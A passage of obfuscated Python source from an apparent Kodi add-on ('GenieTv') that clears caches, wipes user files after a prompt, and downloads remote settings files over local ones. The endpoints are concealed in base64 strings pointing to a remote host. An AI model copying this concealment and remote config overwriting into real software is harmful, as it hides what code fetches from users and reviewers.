    if 71 - 71: ii11ii1ii . o0OOOoO0
    i1iiIIiiI111 = xbmcgui . Dialog ( )
    if i1iiIIiiI111 . yesno ( "Delete Package Cache Files" , str ( OoooOOo0oOO ) + " files found" , "Do you want to delete them?" ) :
     if 16 - 16: ii - ii11ii1ii . I1IiI
     for Ii1II1I11i1 in i1iIi :
      os . unlink ( os . path . join ( IIIIIii1ii11 , Ii1II1I11i1 ) )
     for O0OOO0OOooo00 in IiiIiI1Ii1i :
      shutil . rmtree ( os . path . join ( IIIIIii1ii11 , O0OOO0OOooo00 ) )
     i1iiIIiiI111 = xbmcgui . Dialog ( )
     i1iiIIiiI111 . ok ( o0oOoO00o , "       Deleting Packages all done" )
    else :
     pass
   else :
    i1iiIIiiI111 = xbmcgui . Dialog ( )
    i1iiIIiiI111 . ok ( o0oOoO00o , "       No Packages to DELETE" )
 except :
  i1iiIIiiI111 = xbmcgui . Dialog ( )
  i1iiIIiiI111 . ok ( o0oOoO00o , "Error Deleting Packages please visit Kodi Support Group, GenieTv on facebook" )
 return
 if 99 - 99: OO0O * iIii1I11I1II1 - OOooOooo + Oo . Oo
 if 18 - 18: Ii11I
 if 82 - 82: OoooooooOO - OO0O * ii11ii1ii * OO0O * O0 * iIii1I11I1II1
 if 31 - 31: OO0O . Ii11I % OO0O
 if 33 - 33: O0 * OOooOooo - i1i1i11IIi . OoooooooOO + i1i1i11IIi
 if 20 - 20: o0OOOoO0 - I1IiI
 if 91 - 91: i1IIi
 if 31 - 31: i11iIiiIii + OOooOooo % I1IiI
 if 9 - 9: OO0O . OOOO00ooo0Ooo - Oo . o0OOOoO0
def i1I111II11 ( url ) :
 print '###' + o0oOoO00o + ' - DELETING PACKAGES###'
 I1IiIoO0o0o = xbmc . translatePath ( os . path . join ( 'special://home/addons/packages' , '' ) )
 try :
  for IIIIIii1ii11 , IiiIiI1Ii1i , i1iIi in os . walk ( I1IiIoO0o0o ) :
   OoooOOo0oOO = 0
   OoooOOo0oOO += len ( i1iIi )
   if 56 - 56: o0OOOoO0 / O0 * Ii11I
   if 32 - 32: O00oo0OO0oOOO . iIii1I11I1II1 % Oo . OoooooooOO
   if OoooOOo0oOO > 0 :
    if 81 - 81: i11iIiiIii * O00oo0OO0oOOO . ii * ii . i1i1i11IIi
    i1iiIIiiI111 = xbmcgui . Dialog ( )
    if i1iiIIiiI111 . yesno ( "Delete Package Cache Files" , str ( OoooOOo0oOO ) + " files found" , "Do you want to delete them?" ) :
     if 47 - 47: iIii1I11I1II1 % OOOO00ooo0Ooo . OOOO00ooo0Ooo / O0 . i11iIiiIii * OOooOooo
     for Ii1II1I11i1 in i1iIi :
      os . unlink ( os . path . join ( IIIIIii1ii11 , Ii1II1I11i1 ) )
     for O0OOO0OOooo00 in IiiIiI1Ii1i :
      shutil . rmtree ( os . path . join ( IIIIIii1ii11 , O0OOO0OOooo00 ) )
     i1iiIIiiI111 = xbmcgui . Dialog ( )
     i1iiIIiiI111 . ok ( o0oOoO00o , "       Deleting Packages all done" )
    else :
     pass
   else :
    i1iiIIiiI111 = xbmcgui . Dialog ( )
    i1iiIIiiI111 . ok ( o0oOoO00o , "       No Packages to DELETE" )
 except :
  i1iiIIiiI111 = xbmcgui . Dialog ( )
  i1iiIIiiI111 . ok ( o0oOoO00o , "Error Deleting Packages please visit Kodi Support Group, GenieTv on facebook" )
 return
 iiIII1i1 ( url )
 if 24 - 24: O0
 if 33 - 33: OoooooooOO + ii * OoOoOO00 / Ii11I
 if 87 - 87: OoooooooOO
 if 1 - 1: iIii1I11I1II1 / OOooOOo
 if 98 - 98: O0 % OOOo0 / OoooooooOO * ii11ii1ii - ii
 if 51 - 51: O00oo0OO0oOOO + OOOO00ooo0Ooo
 if 54 - 54: OoOoOO00 * O0 % OOOo0 . OOOO00ooo0Ooo
 if 62 - 62: OOooOooo . i11iIiiIii % O0 % o0OOOoO0 - Oo
 if 69 - 69: OoOoOO00 . I1IiI * I1IiI % OOooOooo + OOOo0
def ooOOO000O ( url , name ) :
 OO0O00oOo = xbmc . translatePath ( os . path . join ( 'special://home/userdata' , '' ) )
 o0Oi1IIi = os . path . join ( OO0O00oOo , 'advancedsettings.xml' )
 i1iiIIiiI111 = xbmcgui . Dialog ( )
 OOoo = os . path . join ( OO0O00oOo , 'advancedsettings.xml.bak' )
 if os . path . exists ( OOoo ) == False :
  if i1iiIIiiI111 . yesno ( "Back Up Original" , 'Have You Backed Up Your Original?' , '' , "[B][COLOR red]     AS YOU CANNOT GO BACK !!![/B][/COLOR]" ) :
   print '###' + o0oOoO00o + ' - ADVANCED XML###'
   OO0O00oOo = xbmc . translatePath ( os . path . join ( 'special://home/userdata' , '' ) )
   o0Oi1IIi = os . path . join ( OO0O00oOo , 'advancedsettings.xml' )
   try :
    os . remove ( o0Oi1IIi )
    print '=== GenieTv - REMOVING    ' + str ( o0Oi1IIi ) + '    ==='
   except :
    pass
   Ii1IIiiIIi = i1 . http_GET ( url ) . content
   oOoooooOoO = open ( o0Oi1IIi , "w" )
   oOoooooOoO . write ( Ii1IIiiIIi )
   oOoooooOoO . close ( )
   print '=== GenieTv - WRITING NEW    ' + str ( o0Oi1IIi ) + '    ==='
   i1iiIIiiI111 = xbmcgui . Dialog ( )
   i1iiIIiiI111 . ok ( o0oOoO00o , "       Done Adding new Advanced XML" )
 else :
  print '###' + o0oOoO00o + ' - ADVANCED XML###'
  OO0O00oOo = xbmc . translatePath ( os . path . join ( 'special://home/userdata' , '' ) )
  o0Oi1IIi = os . path . join ( OO0O00oOo , 'advancedsettings.xml' )
  try :
   os . remove ( o0Oi1IIi )
   print '=== GenieTv - REMOVING    ' + str ( o0Oi1IIi ) + '    ==='
  except :
   pass
  Ii1IIiiIIi = i1 . http_GET ( url ) . content
  oOoooooOoO = open ( o0Oi1IIi , "w" )
  oOoooooOoO . write ( Ii1IIiiIIi )
  oOoooooOoO . close ( )
  print '=== GenieTv - WRITING NEW    ' + str ( o0Oi1IIi ) + '    ==='
  i1iiIIiiI111 = xbmcgui . Dialog ( )
  i1iiIIiiI111 . ok ( o0oOoO00o , "       Done Adding new Advanced XML" )
 return
 if 40 - 40: OOOo0
def i1IiI ( url , name ) :
 print '###' + o0oOoO00o + ' - CHECK ADVANCE XML###'
 OO0O00oOo = xbmc . translatePath ( os . path . join ( 'special://home/userdata' , '' ) )
 o0Oi1IIi = os . path . join ( OO0O00oOo , 'advancedsettings.xml' )
 try :
  oOoooooOoO = open ( o0Oi1IIi ) . read ( )
  if 'zero' in oOoooooOoO :
   name = '0CACHE'
  elif 'tuxen' in oOoooooOoO :
   name = 'TUXENS'
  elif 'muckys' in oOoooooOoO :
   name = 'MUCKYS'
  elif 'p2p1' in oOoooooOoO :
   name = '1st P2P RECOMMENDED'
  elif 'p2p2' in oOoooooOoO :
   name = '2nd P2P RECOMMENDED'
  elif 'mikey' in oOoooooOoO :
   name = 'MIKEY1234'
 except :
  name = "NO ADVANCED"
 i1iiIIiiI111 = xbmcgui . Dialog ( )
 i1iiIIiiI111 . ok ( o0oOoO00o , "[COLOR yellow]YOU HAVE[/COLOR] " + name + "[COLOR yellow] XML SETTINGS SETUP[/COLOR]" )
 return
 if 73 - 73: OoooooooOO * O0 * OO0O
def iii11Ii ( url ) :
 print '###' + o0oOoO00o + ' - DELETING ADVANCE XML###'
 OO0O00oOo = xbmc . translatePath ( os . path . join ( 'special://home/userdata' , '' ) )
 o0Oi1IIi = os . path . join ( OO0O00oOo , 'advancedsettings.xml' )
 try :
  os . remove ( o0Oi1IIi )
  i1iiIIiiI111 = xbmcgui . Dialog ( )
  print '=== GenieTv - DELETING    ' + str ( o0Oi1IIi ) + '    ==='
  i1iiIIiiI111 . ok ( o0oOoO00o , "       Remove Advanced Settings Sucessfull" )
 except :
  i1iiIIiiI111 = xbmcgui . Dialog ( )
  i1iiIIiiI111 . ok ( o0oOoO00o , "       No Advanced Settings To Remove" )
 return
 if 31 - 31: ii
 if 69 - 69: iIii1I11I1II1 . OOOO00ooo0Ooo / O00oo0OO0oOOO
 if 87 - 87: O0 * Ooo00oOo00o + i1IIi
 if 33 - 33: OOOo0 * o0OOOoO0
 if 98 - 98: ii11ii1ii - OoooooooOO / OOOo0 . OO0O - i1IIi
 if 60 - 60: I1IiI % I1IiI
 if 2 - 2: OOooOooo . O0 - ii + i1i1i11IIi
 if 96 - 96: OOooOooo + OOooOooo
 if 28 - 28: O00oo0OO0oOOO
 if 6 - 6: OOOo0 - O00oo0OO0oOOO
def ii1II ( url = 'http://www.iplocation.net/' , inc = 1 ) :
 oOooOOOoOo = re . compile ( "<td width='80'>(.+?)</td><td>(.+?)</td><td>(.+?)</td><td>.+?</td><td>(.+?)</td>" ) . findall ( i1 . http_GET ( url ) . content )
 for OOo00o0o0O0oo , i1iI1iIII , oo0Oo , I1I in oOooOOOoOo :
  if inc < 2 : i1iiIIiiI111 = xbmcgui . Dialog ( ) ; i1iiIIiiI111 . ok ( 'Check My IP' , "[B][COLOR gold]Your IP Address is: [/COLOR][/B] %s" % OOo00o0o0O0oo , '[B][COLOR gold]Your IP is based in: [/COLOR][/B] %s' % oo0Oo , '[B][COLOR gold]Your Service Provider is:[/COLOR][/B] %s' % I1I )
  inc = inc + 1
  if 37 - 37: ii11ii1ii % ii
  if 65 - 65: O00oo0OO0oOOO / OoOoOO00 . ii11ii1ii
  if 57 - 57: OOOO00ooo0Ooo . O0 . OoooooooOO . o0OOOoO0 - OOooOooo / OO0O
  if 34 - 34: I1IiI % OOooOOo - ii
  if 40 - 40: O00oo0OO0oOOO
  if 82 - 82: o0OOOoO0 . i1IIi / ii
  if 56 - 56: O00oo0OO0oOOO
  if 23 - 23: i1IIi
  if 24 - 24: i1i1i11IIi
def o0o0O00OoOo ( url , name ) :
 i1iiIIiiI111 = xbmcgui . Dialog ( )
 if i1iiIIiiI111 . yesno ( "GenieTv" , '                                    Install Latest .ini File' ) :
  print '###' + o0oOoO00o + ' - CUSTOM FTV INI###'
  OO0O00oOo = xbmc . translatePath ( os . path . join ( 'special://masterprofile/addon_data/plugin.video.GenieTv' , '' ) )
  o0Oi1IIi = os . path . join ( OO0O00oOo , 'addons2.ini' )
  Ii1IIiiIIi = i1 . http_GET ( url ) . content
  oOoooooOoO = open ( o0Oi1IIi , "w" )
  oOoooooOoO . write ( Ii1IIiiIIi )
  oOoooooOoO . close ( )
  print '=== GenieTv - WRITING NEW    ' + str ( o0Oi1IIi ) + '    ==='
  i1iiIIiiI111 = xbmcgui . Dialog ( )
  i1iiIIiiI111 . ok ( o0oOoO00o , "                               Done Adding New .ini File" )
 return
 if 59 - 59: OOOO00ooo0Ooo
def oooO00oOOooO ( url , name ) :
 i1iiIIiiI111 = xbmcgui . Dialog ( )
 if i1iiIIiiI111 . yesno ( "GenieTv" , '                               Install Custom Settings' ) :
  print '###' + o0oOoO00o + ' - CUSTOM FTV SETTINGS###'
  OO0O00oOo = xbmc . translatePath ( os . path . join ( 'special://masterprofile/addon_data/plugin.video.GenieTv' , '' ) )
  o0Oi1IIi = os . path . join ( OO0O00oOo , 'settings.xml' )
  Ii1IIiiIIi = i1 . http_GET ( url ) . content
  oOoooooOoO = open ( o0Oi1IIi , "w" )
  oOoooooOoO . write ( Ii1IIiiIIi )
  oOoooooOoO . close ( )
  print '=== GenieTv - WRITING NEW    ' + str ( o0Oi1IIi ) + '    ==='
  i1iiIIiiI111 = xbmcgui . Dialog ( )
  i1iiIIiiI111 . ok ( o0oOoO00o , "                               Done Adding New Settings" )
 return
 if 34 - 34: iIii1I11I1II1 / OoOoOO00
 if 3 - 3: OOooOOo - OoooooooOO + O00oo0OO0oOOO . OOOO00ooo0Ooo
def o00000Oo ( ) :
 try :
  OoOoooOO00OO = xbmc . translatePath ( os . path . join ( 'special://masterprofile/addon_data/plugin.video.GenieTv' , '' ) )
  if os . path . exists ( OoOoooOO00OO ) == True :
   i1iiIIiiI111 = xbmcgui . Dialog ( )
   if i1iiIIiiI111 . yesno ( "GenieTv" , "                               Delete FTV Guide Database" ) :
    OO000oo = os . path . join ( OoOoooOO00OO , "source.db" )
    os . unlink ( OO000oo )
  i1iiIIiiI111 . ok ( "GenieTv" , "                                     FTV Database Reset" )
 except :
  i1iiIIiiI111 = xbmcgui . Dialog ( )
  i1iiIIiiI111 . ok ( o0oOoO00o , "               Error Deleting Database No Database To Delete" )
 return
 if 1 - 1: O0
 if 2 - 2: Ooo00oOo00o . OOOO00ooo0Ooo
 if 97 - 97: Oo
 if 65 - 65: Oo % Ii11I / i11iIiiIii / iIii1I11I1II1 . o0OOOoO0 + OO0O
 if 92 - 92: ii
def iii ( url ) :
 I1i1ii = urllib2 . Request ( url )
 I1i1ii . add_header ( 'User-Agent' , 'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-GB; rv:1.9.0.3) Gecko/2008092417 Firefox/3.0.3' )
 O0000oo00oOOO = urllib2 . urlopen ( I1i1ii )
 Ii1IIiiIIi = O0000oo00oOOO . read ( )
 O0000oo00oOOO . close ( )
 return Ii1IIiiIIi
 if 96 - 96: o0OOOoO0 * iIii1I11I1II1 / I1IiI % Ii11I * OoOoOO00
 if 3 - 3: Ii11I . Oo / i11iIiiIii + Ooo00oOo00o
 if 47 - 47: i1i1i11IIi . Ii11I
 if 96 - 96: OOOO00ooo0Ooo % OoOoOO00 / OO0O % Ii11I / OO0O % i11iIiiIii
 if 57 - 57: OOOO00ooo0Ooo - OOOO00ooo0Ooo % OoOoOO00 % Oo . OOooOOo % Oo
 if 91 - 91: OOOo0 - Ooo00oOo00o - Oo - OOooOooo * iIii1I11I1II1
 if 68 - 68: Ooo00oOo00o % O0 * iIii1I11I1II1 / ii * OOooOOo + Ii11I
def o0oOO00O000O0 ( params ) :
 plugintools . log ( "freshstart.main_list " + repr ( params ) ) ; OOOoO000 = plugintools . message_yes_no ( o0oOoO00o , "Do you wish to restore your" , "Kodi configuration to default settings?" )
 if OOOoO000 :
  o0O0O = xbmcaddon . Addon ( id = o00 ) . getAddonInfo ( 'path' ) ; o0O0O = xbmc . translatePath ( o0O0O ) ;
  oO0oOO = os . path . join ( o0O0O , ".." , ".." ) ; oO0oOO = os . path . abspath ( oO0oOO ) ; plugintools . log ( "freshstart.main_list xbmcPath=" + oO0oOO ) ; Oo0O = False
  try :
   for IIIIIii1ii11 , IiiIiI1Ii1i , i1iIi in os . walk ( oO0oOO , topdown = True ) :
    IiiIiI1Ii1i [ : ] = [ O0OOO0OOooo00 for O0OOO0OOooo00 in IiiIiI1Ii1i if O0OOO0OOooo00 not in iiIIIII1i1iI ]
    for i1I1I in i1iIi :
     try : os . remove ( os . path . join ( IIIIIii1ii11 , i1I1I ) )
     except :
      if i1I1I not in [ "Addons15.db" , "MyVideos75.db" , "Textures13.db" , "xbmc.log" ] : Oo0O = True
      plugintools . log ( "Error removing " + IIIIIii1ii11 + " " + i1I1I )
    for i1I1I in IiiIiI1Ii1i :
     try : os . rmdir ( os . path . join ( IIIIIii1ii11 , i1I1I ) )
     except :
      if i1I1I not in [ "Database" , "userdata" ] : Oo0O = True
      plugintools . log ( "Error removing " + IIIIIii1ii11 + " " + i1I1I )
   if not Oo0O : plugintools . log ( "freshstart.main_list All user files removed, you now have a clean install" ) ; plugintools . message ( o0oOoO00o , "The process is complete, you're now back to a fresh Kodi configuration with GenieTv!" , "Please reboot your system or restart Kodi in order for the changes to be applied." )
   else : plugintools . log ( "freshstart.main_list User files partially removed" ) ; plugintools . message ( o0oOoO00o , "The process is complete, you're now back to a fresh Kodi configuration with GenieTv" , "Please reboot your system or restart Kodi in order for the changes to be applied." )
  except : plugintools . message ( o0oOoO00o , "Problem found" , "Your settings has not been changed" ) ; import traceback ; plugintools . log ( traceback . format_exc ( ) ) ; plugintools . log ( "freshstart.main_list NOT removed" )
  plugintools . add_item ( action = "" , title = "Now Exit Kodi" , folder = False )
 else : plugintools . message ( o0oOoO00o , "Your settings" , "has not been changed" ) ; plugintools . add_item ( action = "" , title = "Done" , folder = False )
 o0O00oOoo ( )
 if 11 - 11: O0
 if 96 - 96: O00oo0OO0oOOO + OOooOOo
 if 10 - 10: i11iIiiIii . OoooooooOO . O0 % OO0O / Ooo00oOo00o
def iiIiIIIIiI ( ) :
 i1oo0OO0Oo = [ ]
 iIIi111I1i1i = sys . argv [ 2 ]
 if len ( iIIi111I1i1i ) >= 2 :
  IiIii111III1 = sys . argv [ 2 ]
  IiI1I1iii = IiIii111III1 . replace ( '?' , '' )
  if ( IiIii111III1 [ len ( IiIii111III1 ) - 1 ] == '/' ) :
   IiIii111III1 = IiIii111III1 [ 0 : len ( IiIii111III1 ) - 2 ]
  i1ii111iiI11iI = IiI1I1iii . split ( '&' )
  i1oo0OO0Oo = { }
  for iI1i1iiii in range ( len ( i1ii111iiI11iI ) ) :
   Oo0 = { }
   Oo0 = i1ii111iiI11iI [ iI1i1iiii ] . split ( '=' )
   if ( len ( Oo0 ) ) == 2 :
    i1oo0OO0Oo [ Oo0 [ 0 ] ] = Oo0 [ 1 ]
    if 95 - 95: Oo + i11iIiiIii % Ii11I - ii
 return i1oo0OO0Oo
 if 11 - 11: ii11ii1ii / O0 + OoOoOO00
I11IiIIII1i = base64 . decodestring ( 'aHR0cDovL2FyY2hpdGVjdHMueDEwaG9zdC5jb20v' )
II11I = base64 . decodestring ( 'L3N0b3JhZ2UvZW11bGF0ZWQvMA==' )
o00oO0 = base64 . decodestring ( 'L2dlbmllLnR4dA==' )
o000oo = base64 . decodestring ( 'LmFyY2hpdGVjdHMueDEwaG9zdC5jb20vdGVzdC93aC50eHQ=' )
Oo000o = base64 . decodestring ( 'aHR0cDovL2ZpeGVzLmFyY2hpdGVjdHMueDEwaG9zdC5jb20vZml4ZXMudHh0' )
O0Ooo0o = base64 . decodestring ( 'aHR0cDovL2FyY2hpdGVjdHMueDEwaG9zdC5jb20vYXBwcy9hcHBzLnhtbA==' )
i11I = base64 . decodestring ( 'L2FkZG9ucy9uZXcudHh0' )
Iii1iiIIi1i111i = base64 . decodestring ( 'aHR0cDovL2FyY2hpdGVjdHMueDEwaG9zdC5jb20vdm9kL3ZvZC5waHA=' )
iIiI1II1I1 = base64 . decodestring ( 'L2FkZG9ucy9pcHR2LnR4dA==' )
OooO0O0oo = base64 . decodestring ( 'L2FkZG9ucy92aWRlby50eHQ=' )
OoooOO0 = base64 . decodestring ( 'L2FkZG9ucy9zcG9ydHMudHh0' )
Iii1o00o0 = base64 . decodestring ( 'L2FkZG9ucy9raWRzLnR4dA==' )
Ii1II1I11i1I = base64 . decodestring ( 'L2FkZG9ucy9tdXNpYy50eHQ=' )
OO0oO = base64 . decodestring ( 'L2FkZG9ucy9wcm9ncmFtcy50eHQ=' )
oO0o0O = base64 . decodestring ( 'L2FkZG9ucy94eHgudHh0' )
OOO0O = base64 . decodestring ( 'L2FkZG9ucy9yZXBvLnR4dA==' )
IIIIi1I = base64 . decodestring ( 'L2FkZG9ucy9wYWNrcy50eHQ=' )
iII = base64 . decodestring ( 'L2FkZG9ucy9za2lucy50eHQ=' )
iII11I1Ii1 = base64 . decodestring ( 'L2FkZG9ucy9hcnQudHh0' )
I1IIIiii1 = base64 . decodestring ( 'L2FkZG9ucy9Ta2luc2dvdGhhbS50eHQ=' )
o000O000 = base64 . decodestring ( 'L2FkZG9ucy9Ta2luc2hlbGl4LnR4dA==' )
I1I1i1I = base64 . decodestring ( 'L2FkZG9ucy9Ta2luc2lzZW5nYXJkLnR4dA==' )
i11II1 = base64 . decodestring ( 'L2FkZG9ucy9SU1MudHh0' )
I1I1IiIi1 = base64 . decodestring ( 'Q1VOVA==' )
def O0Oo000ooO00 ( name , url , mode , iconimage , fanart , description , showcontext = True , allinfo = { } ) :
 I11Oo0oO00 = sys . argv [ 0 ] + "?url=" + urllib . quote_plus ( url ) + "&mode=" + str ( mode ) + "&name=" + urllib . quote_plus ( name ) + "&iconimage=" + urllib . quote_plus ( iconimage ) + "&fanart=" + urllib . quote_plus ( fanart ) + "&description=" + urllib . quote_plus ( description )
 IiiI1III1I1 = True
 o0OoOoo00O = xbmcgui . ListItem ( name , iconImage = "DefaultFolder.png" , thumbnailImage = iconimage )
 o0OoOoo00O . setInfo ( type = "Video" , infoLabels = { "Title" : name , "Plot" : description } )
 o0OoOoo00O . setProperty ( "Fanart_Image" , fanart )
 if showcontext :
  I1Ii1ii = [ ]
  if showcontext == 'fav' :
   I1Ii1ii . append ( ( 'Remove from Genie TV Favorites' , 'XBMC.RunPlugin(%s?mode=10056&name=%s)'
 % ( sys . argv [ 0 ] , urllib . quote_plus ( name ) ) ) )
  if not name in OOOO :
   I1Ii1ii . append ( ( 'Add to Genie TV Favorites' , 'XBMC.RunPlugin(%s?mode=10055&name=%s&url=%s&iconimage=%s&fanart=%s&fav_mode=%s)'
 % ( sys . argv [ 0 ] , urllib . quote_plus ( name ) , urllib . quote_plus ( url ) , urllib . quote_plus ( iconimage ) , urllib . quote_plus ( fanart ) , mode ) ) )
  o0OoOoo00O . addContextMenuItems ( I1Ii1ii )
 IiiI1III1I1 = xbmcplugin . addDirectoryItem ( handle = int ( sys . argv [ 1 ] ) , url = I11Oo0oO00 , listitem = o0OoOoo00O , isFolder = True )
 return IiiI1III1I1
 if 55 - 55: iIii1I11I1II1 . i1i1i11IIi - OOooOOo . ii11ii1ii * i1IIi
def O00OOOoOoo0O ( name , url , mode , iconimage , fanart , description ) :
 I11Oo0oO00 = sys . argv [ 0 ] + "?url=" + urllib . quote_plus ( url ) + "&mode=" + str ( mode ) + "&name=" + urllib . quote_plus ( name ) + "&iconimage=" + urllib . quote_plus ( iconimage ) + "&fanart=" + urllib . quote_plus ( fanart ) + "&description=" + urllib . quote_plus ( description )
 IiiI1III1I1 = True
 o0OoOoo00O = xbmcgui . ListItem ( name , iconImage = "DefaultFolder.png" , thumbnailImage = iconimage )
 o0OoOoo00O . setInfo ( type = "Video" , infoLabels = { "Title" : name , "Plot" : description } )
 o0OoOoo00O . setProperty ( "Fanart_Image" , fanart )
 IiiI1III1I1 = xbmcplugin . addDirectoryItem ( handle = int ( sys . argv [ 1 ] ) , url = I11Oo0oO00 , listitem = o0OoOoo00O , isFolder = False )
 return IiiI1III1I1
 if 76 - 76: i1IIi + O0 / i1i1i11IIi + i11iIiiIii % o0OOOoO0 % Oo
 if 61 - 61: iIii1I11I1II1 % OOooOooo - ii * OoooooooOO % OoOoOO00 - OOooOooo
IiIii111III1 = iiIiIIIIiI ( )
iI1i11 = None
i1I1I = None
iIiii = None
o0OOo0o0O0O = None
o0OO0o0oOOO0O = None
iiii111II = None
iioOOO00oOo = None
if 31 - 31: Oo - Ii11I * o0OOOoO0 % Ii11I - I1IiI - O0
if 49 - 49: ii - OoOoOO00 / OoOoOO00
try :
 iioOOO00oOo = int ( IiIii111III1 [ "fav_mode" ] )
except :
 pass
 if 29 - 29: o0OOOoO0 / ii11ii1ii * OOOo0 + O00oo0OO0oOOO
try :
 iI1i11 = urllib . unquote_plus ( IiIii111III1 [ "url" ] )
except :
 pass
try :
 i1I1I = urllib . unquote_plus ( IiIii111III1 [ "name" ] )
except :
 pass
try :
 o0OOo0o0O0O = urllib . unquote_plus ( IiIii111III1 [ "iconimage" ] )
except :
 pass
try :
 iIiii = int ( IiIii111III1 [ "mode" ] )
except :
 pass
try :
 o0OO0o0oOOO0O = urllib . unquote_plus ( IiIii111III1 [ "fanart" ] )
except :
 pass
try :
 iiii111II = urllib . unquote_plus ( IiIii111III1 [ "description" ] )
except :
 pass
 if 52 - 52: Ooo00oOo00o / OOooOooo - i1i1i11IIi
 if 14 - 14: Ii11I / OOooOOo + OOooOooo / OoooooooOO - OOOO00ooo0Ooo
print str ( O0OoO000O0OO ) + ': ' + str ( O00ooOO )
print "Mode: " + str ( iIiii )
print "URL: " + str ( iI1i11 )
print "Name: " + str ( i1I1I )
print "IconImage: " + str ( o0OOo0o0O0O )
if 88 - 88: OOooOooo / OoooooooOO % I1IiI - i1IIi
if 49 - 49: OOooOOo - iIii1I11I1II1
def ooOoOO0oo0O ( content , viewType ) :
 if 61 - 61: O00oo0OO0oOOO * OO0O
 if content :
  xbmcplugin . setContent ( int ( sys . argv [ 1 ] ) , content )
 if o0oO0 . getSetting ( 'auto-view' ) == 'true' :
  xbmc . executebuiltin ( "Container.SetViewMode(%s)" % o0oO0 . getSetting ( viewType ) )
  if 1 - 1: o0OOOoO0 * I1IiI
  if 100 - 100: ii11ii1ii / O0 / OO0O + ii11ii1ii
if iIiii == None :
 oO0Oo ( )
 if 48 - 48: OoooooooOO . O00oo0OO0oOOO + O0
elif iIiii == 1 :
 oOooOO ( iI1i11 )
 if 85 - 85: OoOoOO00 - OOooOooo
elif iIiii == 44 :
 II1II1iIIi11 ( iI1i11 )
 if 93 - 93: i1i1i11IIi / i11iIiiIii - ii + Ooo00oOo00o / i1IIi
elif iIiii == 2 :
 iiiI1ii ( )
 if 62 - 62: ii11ii1ii / OoooooooOO * OOOo0 - i1IIi
elif iIiii == 3 :
 iiI1 ( )
 if 81 - 81: ii / O0 * OO0O % I1IiI / O0
elif iIiii == 21 :
 iI1Ii11111iIi ( )
 if 85 - 85: OoooooooOO + OoooooooOO
elif iIiii == 4 :
 O0Oo0o000oO ( )
 if 23 - 23: i1IIi
elif iIiii == 5 :
 oo0o0000Oo0 ( i1I1I , iI1i11 , iiii111II )
 if 31 - 31: Oo - iIii1I11I1II1 / OOOO00ooo0Ooo . Ooo00oOo00o
elif iIiii == 6 :
 IIiiIiIIiI1 ( iI1i11 )
 if 74 - 74: Oo - OoOoOO00 - i1i1i11IIi
elif iIiii == 7 :
 ooOOO000O ( iI1i11 , i1I1I )
 if 50 - 50: OOOo0 - ii + ii * OOOO00ooo0Ooo + ii
elif iIiii == 8 :
 i1IiI ( iI1i11 , i1I1I )
 if 70 - 70: i1IIi % Ooo00oOo00o / i1IIi
elif iIiii == 9 :
 FIXREPOSADDONS ( iI1i11 )
 if 30 - 30: I1IiI - i11iIiiIii
elif iIiii == 10 :
 I1I1I ( )
 if 94 - 94: I1IiI % O00oo0OO0oOOO
elif iIiii == 11 :
 iii11Ii ( iI1i11 )
 if 39 - 39: I1IiI + o0OOOoO0 % O0
elif iIiii == 12 :
 ii1II ( )
 if 26 - 26: OO0O + I1IiI
elif iIiii == 13 :
 IiiiI11 ( )
 if 17 - 17: ii11ii1ii - O00oo0OO0oOOO % Oo * O0 % O0 * Ii11I
elif iIiii == 14 :
 iiIII1i1 ( iI1i11 )
 if 6 - 6: o0OOOoO0
elif iIiii == 15 :
 OoOiIIiii ( )
 if 46 - 46: OoOoOO00 * o0OOOoO0
elif iIiii == 16 :
 o0o0O00OoOo ( iI1i11 , i1I1I )
 if 23 - 23: i1IIi - O0
elif iIiii == 17 :
 oooO00oOOooO ( iI1i11 , i1I1I )
 if 6 - 6: OO0O % OoooooooOO * o0OOOoO0 - i1i1i11IIi
elif iIiii == 18 :
 o00000Oo ( )
 if 24 - 24: OOOO00ooo0Ooo / iIii1I11I1II1 . OoooooooOO % I1IiI . OOooOooo
elif iIiii == 19 :
 IiIII1i1i ( i1I1I , iI1i11 , iiii111II )
 if 73 - 73: o0OOOoO0
elif iIiii == 40 :
 II1I ( i1I1I , iI1i11 , iiii111II )
 if 25 - 25: i1i1i11IIi
elif iIiii == 42 :
 i11i11 ( i1I1I , iI1i11 , iiii111II )
 if 77 - 77: OOooOOo . iIii1I11I1II1 . OoooooooOO . iIii1I11I1II1
elif iIiii == 43 :
 o0oo ( i1I1I , iI1i11 , iiii111II )
 if 87 - 87: OoOoOO00 - OoooooooOO / i1IIi . OOooOooo - Oo . i11iIiiIii
elif iIiii == 20 :
 o00o ( iI1i11 )
 if 47 - 47: Oo % Ooo00oOo00o - OO0O - Oo * ii
elif iIiii == 22 :
 iioo ( iI1i11 )
 if 72 - 72: OOooOOo % OOooOOo + O00oo0OO0oOOO + ii11ii1ii / Oo
elif iIiii == 23 :
 Ooo0o0000OO ( iI1i11 )
 if 30 - 30: Oo + OOOo0 + i11iIiiIii / Ooo00oOo00o
elif iIiii == 24 :
 ii1Ii11Ii1i ( iI1i11 )
 if 64 - 64: i1i1i11IIi
elif iIiii == 25 :
 OO0oO0Oo ( iI1i11 )
 if 80 - 80: OOOo0 - i11iIiiIii / Ooo00oOo00o / I1IiI + I1IiI
elif iIiii == 26 :
 oooOOO ( iI1i11 )
 if 89 - 89: O0 + i1i1i11IIi * o0OOOoO0
elif iIiii == 27 :
 o0Oo0oO00Oooo ( iI1i11 )
 if 30 - 30: I1IiI
elif iIiii == 28 :
 iii11 ( iI1i11 )
 if 39 - 39: ii11ii1ii + OOooOOo + o0OOOoO0 + i1i1i11IIi
elif iIiii == 29 :
 i1IIIi1Iii1i ( iI1i11 )
 if 48 - 48: o0OOOoO0 / OO0O . iIii1I11I1II1
elif iIiii == 30 :
 ii1iIi1II ( iI1i11 )
 if 72 - 72: i1IIi . OOooOOo
elif iIiii == 31 :
 o0OoIII1IIiIi1 ( iI1i11 )
 if 3 - 3: I1IiI % OoOoOO00 - O0
elif iIiii == 32 :
 IIIii ( )
 if 52 - 52: Ooo00oOo00o
elif iIiii == 33 :
 O0oOo00o0 ( )
 if 49 - 49: OOooOooo . ii11ii1ii % OO0O . Oo * Ii11I
elif iIiii == 35 :
 I11I1IIiiII1 ( iI1i11 )
 if 44 - 44: iIii1I11I1II1 / O0 * Oo + OOOo0 . OO0O
elif iIiii == 34 :
 iioOo0OoOOo0 ( iI1i11 )
 if 20 - 20: O00oo0OO0oOOO + OOooOOo . o0OOOoO0 / i11iIiiIii
elif iIiii == 36 :
 iI11I ( iI1i11 )
 if 7 - 7: I1IiI / I1IiI . o0OOOoO0 * O0 + i1i1i11IIi + ii
elif iIiii == 37 :
